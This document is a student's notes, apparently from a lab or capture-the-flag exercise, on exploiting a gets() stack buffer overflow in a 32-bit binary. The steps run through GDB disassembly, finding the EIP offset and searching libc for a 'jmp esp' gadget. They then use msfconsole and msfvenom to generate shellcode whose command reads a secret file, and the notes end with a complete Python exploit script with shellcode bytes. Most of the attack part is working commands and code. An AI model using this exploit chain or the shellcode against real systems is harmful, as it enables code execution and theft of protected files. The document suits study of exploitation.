# Find out if it's a function without running it

	file <filename>

e.g.

	file func

	func: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=32aeb389448031b78be59ee9f56363d5cf5d22e3, with debug_info, not stripped


# Get Everything the Program reads as human readable

	strings func
```
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
gets
puts
__cxa_finalize
__libc_start_main
GLIBC_2.1.3
GLIBC_2.0
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
UWVS
[^_]
Enter a string: 
;*2$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
/home/student
/usr/lib/gcc/x86_64-linux-gnu/7/include
/usr/include/bits
/usr/include
func.c
stddef.h
types.h
libio.h
stdio.h
sys_errlist.h
_IO_buf_end
__quad_t
_old_offset
array
sys_nerr
_IO_save_end
short int
size_t
/root/ED
_IO_write_ptr
_flags
_IO_buf_base
_markers
_IO_read_end
stderr
_IO_marker
long long int
_lock
gets
_cur_column
_IO_2_1_stderr_
_IO_FILE_plus
_pos
argv
_sbuf
_IO_FILE
unsigned char
argc
long long unsigned int
_IO_2_1_stdin_
/home/student/func.c
_shortbuf
_IO_write_base
_unused2
_IO_read_ptr
short unsigned int
main
_next
__pad1
__pad2
__pad3
__pad4
__pad5
GNU C11 7.5.0 -m32 -mtune=generic -march=i686 -ggdb -fno-stack-protector
_IO_write_end
__off64_t
__off_t
_chain
_IO_backup_base
stdin
_flags2
_mode
_IO_read_base
_vtable_offset
_IO_save_base
sys_errlist
_fileno
getuserinput
stdout
_IO_2_1_stdout_
_IO_lock_t
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7283
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
func.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
gets@@GLIBC_2.0
_edata
__x86.get_pc_thunk.dx
__cxa_finalize@@GLIBC_2.1.3
__data_start
puts@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
getuserinput
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_fp_hw
__bss_start
main
__x86.get_pc_thunk.ax
__TMC_END__
_ITM_registerTMCloneTable
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
```
# Run it with GDB

	gdb func

 ```
gdb func

GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from func...done.


run

Starting program: /home/student/Downloads/func 
Enter a string: 
hello
[Inferior 1 (process 24166) exited with code 056]

```

# Get the main function

	disass main

 ```
Dump of assembler code for function main:
   0x5655554d <+0>:	lea    ecx,[esp+0x4]
   0x56555551 <+4>:	and    esp,0xfffffff0
   0x56555554 <+7>:	push   DWORD PTR [ecx-0x4]
   0x56555557 <+10>:	push   ebp
   0x56555558 <+11>:	mov    ebp,esp
   0x5655555a <+13>:	push   ecx
   0x5655555b <+14>:	sub    esp,0x4
   0x5655555e <+17>:	call   0x565555b0 <__x86.get_pc_thunk.ax>
   0x56555563 <+22>:	add    eax,0x1a71
   0x56555568 <+27>:	call   0x56555577 <getuserinput>
   0x5655556d <+32>:	nop
   0x5655556e <+33>:	add    esp,0x4
   0x56555571 <+36>:	pop    ecx
   0x56555572 <+37>:	pop    ebp
   0x56555573 <+38>:	lea    esp,[ecx-0x4]
   0x56555576 <+41>:	ret    
End of assembler dump.
```

	disass getuserinput

```
Dump of assembler code for function getuserinput:
   0x56555577 <+0>:	push   ebp
   0x56555578 <+1>:	mov    ebp,esp
   0x5655557a <+3>:	push   ebx
   0x5655557b <+4>:	sub    esp,0x44
   0x5655557e <+7>:	call   0x56555450 <__x86.get_pc_thunk.bx>
   0x56555583 <+12>:	add    ebx,0x1a51
   0x56555589 <+18>:	sub    esp,0xc
   0x5655558c <+21>:	lea    eax,[ebx-0x1994]
   0x56555592 <+27>:	push   eax
   0x56555593 <+28>:	call   0x565553e0 <puts@plt>
   0x56555598 <+33>:	add    esp,0x10
   0x5655559b <+36>:	sub    esp,0xc
   0x5655559e <+39>:	lea    eax,[ebp-0x3a]
   0x565555a1 <+42>:	push   eax
   0x565555a2 <+43>:	call   0x565553d0 <gets@plt>
   0x565555a7 <+48>:	add    esp,0x10
   0x565555aa <+51>:	nop
   0x565555ab <+52>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565555ae <+55>:	leave  
   0x565555af <+56>:	ret    
End of assembler dump.
```

# What is puts@plt

	disass 0x565553e0
``` 
Dump of assembler code for function puts@plt:
   0x565553e0 <+0>:	jmp    DWORD PTR [ebx+0x10]
   0x565553e6 <+6>:	push   0x8
   0x565553eb <+11>:	jmp    0x565553c0
End of assembler dump.
```

# See if function is vulnerable

	pdisass  

# Verify it takes input from file and user input

Create file 

	nano test.py
 	chmod +x test.py

	run <<< $(python test.py)

Success

# Test for buffer overflow

***input long string of characters***
```

gdb-peda$ run
Starting program: /home/student/Downloads/func 
Enter a string: 
fldjaaaks;alksjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkfldjaaaks;alksjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd42e ("fldjaaaks;alksj", 'k' <repeats 185 times>...)
EBX: 0x6b6b6b6b ('kkkk')
ECX: 0xf7fb65c0 --> 0xfbad2288 
EDX: 0xf7fb789c --> 0x0 
ESI: 0xf7fb6000 --> 0x1d4d8c 
EDI: 0x0 
EBP: 0x6b6b6b6b ('kkkk')
ESP: 0xffffd470 ('k' <repeats 200 times>...)
EIP: 0x6b6b6b6b ('kkkk')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x6b6b6b6b
[------------------------------------stack-------------------------------------]
0000| 0xffffd470 ('k' <repeats 200 times>...)
0004| 0xffffd474 ('k' <repeats 200 times>...)
0008| 0xffffd478 ('k' <repeats 200 times>...)
0012| 0xffffd47c ('k' <repeats 200 times>...)
0016| 0xffffd480 ('k' <repeats 200 times>...)
0020| 0xffffd484 ('k' <repeats 200 times>...)
0024| 0xffffd488 ('k' <repeats 200 times>...)
0028| 0xffffd48c ('k' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x6b6b6b6b in ?? ()

```

# Find buffer size
```
0x6b6b6b6b in ?? ()
gdb-peda$ disass getuserinput
Dump of assembler code for function getuserinput:
   0x56555577 <+0>:	push   ebp
   0x56555578 <+1>:	mov    ebp,esp
   0x5655557a <+3>:	push   ebx
   0x5655557b <+4>:	sub    esp,0x44
   0x5655557e <+7>:	call   0x56555450 <__x86.get_pc_thunk.bx>
   0x56555583 <+12>:	add    ebx,0x1a51
   0x56555589 <+18>:	sub    esp,0xc
   0x5655558c <+21>:	lea    eax,[ebx-0x1994]
   0x56555592 <+27>:	push   eax
   0x56555593 <+28>:	call   0x565553e0 <puts@plt>
   0x56555598 <+33>:	add    esp,0x10
   0x5655559b <+36>:	sub    esp,0xc
   0x5655559e <+39>:	lea    eax,[ebp-0x3a]
   0x565555a1 <+42>:	push   eax
   0x565555a2 <+43>:	call   0x565553d0 <gets@plt>
   0x565555a7 <+48>:	add    esp,0x10
   0x565555aa <+51>:	nop
   0x565555ab <+52>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565555ae <+55>:	leave  
   0x565555af <+56>:	ret    
End of assembler dump.
 ```
the sub indicates sub tracting 68 showing our buffer

# Test with script

	nano test.py

```

buffer = "A" * 62

eip = "BBBB"

print(buffer + eip)

```


run <<< $(python test.py)

```
gdb-peda$ run <<< $(python test.py)
Starting program: /home/student/Downloads/func <<< $(python test.py)
Enter a string: 

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd42e ('A' <repeats 62 times>, "BBBB")
EBX: 0x41414141 ('AAAA')
ECX: 0xf7fb65c0 --> 0xfbad2088 
EDX: 0xf7fb789c --> 0x0 
ESI: 0xf7fb6000 --> 0x1d4d8c 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd470 --> 0xf7fe5900 (add    BYTE PTR [eax],al)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd470 --> 0xf7fe5900 (add    BYTE PTR [eax],al)
0004| 0xffffd474 --> 0xffffd490 --> 0x1 
0008| 0xffffd478 --> 0x0 
0012| 0xffffd47c --> 0xf7df9fa1 (<__libc_start_main+241>:	add    esp,0x10)
0016| 0xffffd480 --> 0xf7fb6000 --> 0x1d4d8c 
0020| 0xffffd484 --> 0xf7fb6000 --> 0x1d4d8c 
0024| 0xffffd488 --> 0x0 
0028| 0xffffd48c --> 0xf7df9fa1 (<__libc_start_main+241>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()

```
# Set environmental variables 

	env - gdb func

 # See env variables

 	show env

  # Turn off env var

  	unset env LINEs

   	unset env COLUMNS

# Crash program (Within env - gdb) 

Enter "run"

Enter long string of characters to break program

# See mem map (in regular gdb)

	info proc map

 ```
process 24283
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x56555000 0x56556000     0x1000        0x0 /home/student/Downloads/func
	0x56556000 0x56557000     0x1000        0x0 /home/student/Downloads/func
	0x56557000 0x56558000     0x1000     0x1000 /home/student/Downloads/func
	0x56558000 0x5657a000    0x22000        0x0 [heap]
	0xf7de1000 0xf7fb3000   0x1d2000        0x0 /lib32/libc-2.27.so
	0xf7fb3000 0xf7fb4000     0x1000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb4000 0xf7fb6000     0x2000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb6000 0xf7fb7000     0x1000   0x1d4000 /lib32/libc-2.27.so
	0xf7fb7000 0xf7fba000     0x3000        0x0 
	0xf7fcf000 0xf7fd1000     0x2000        0x0 
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```

# Find Range

start at line beneath [heap] to end of [stack]

e.g. 0xf7de1000 - 0xffffe000

# Search Memory starting at bottom of heap going down

	find /b <Top Mem Location> , <Bot Mem Location>, 0xff, 0xe4

 0xff = jump 0xe4 = jump esp 
```
Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
(gdb) find /b 0xf7de1000 , 0xffffe000, 0xff, 0xe4
0xf7de3b59
0xf7f588ab
0xf7f645fb
0xf7f6460f
0xf7f64aeb
0xf7f64aff
0xf7f64d6f
0xf7f64f97
0xf7f650cf
0xf7f65343
0xf7f65497
0xf7f655cf
0xf7f65777
0xf7f659ef
0xf7f662eb
0xf7f6649b
0xf7f66533
0xf7f66633
0xf7f66b3b
0xf7f66b8b
0xf7f66cdb
0xf7f67033
0xf7f67203
0xf7f67293

```

# Start metasploit
 msfconsole

 use payload/linux/x86/exec

 show options
 
 set CMD whoami

show options

generate -b "\x00" -f python

***take buf and copy into script***

run <<< $(python test.py)

# **OR**
 
# Venom One Liner

msfvenom -p linux/x86/exec CMD="whoami && cat /.secret/.verysecret.pdb" -b '\x00' -f python 


# Final Script
```
buffer = "A" * 76

eip = "\x51\x1b\xdf\xf7"

nop = '\x90' * 5

buf =  b""
buf += b"\xd9\xeb\xba\x16\xea\x0d\x98\xd9\x74\x24\xf4\x5e"
buf += b"\x33\xc9\xb1\x13\x31\x56\x19\x03\x56\x19\x83\xc6"
buf += b"\x04\xf4\x1f\x67\x93\xa0\x46\x2a\xc5\x38\x54\xa8"
buf += b"\x80\x5f\xce\x01\xe0\xf7\x0f\x36\x29\x65\x79\xa8"
buf += b"\xbc\x8a\x2b\xdc\x98\x4c\xcc\x1c\x90\x24\xa3\x7d"
buf += b"\x33\xdd\x1b\x58\xed\x3d\x3f\xc5\x85\x1d\x90\x2b"
buf += b"\x15\x38\x8d\x41\xbc\xb6\x7e\x88\x48\x53\xf3\xad"
buf += b"\xc7\xfe\x90\x3f\x4d\x74\x79\xb0\xe9\x16\x85\x67"
buf += b"\xa1\x5f\x64\x4a\xc5"

print(buffer + eip + nop + buf)

```

# On New Box

Run gdb against script against and see output, modify as needed


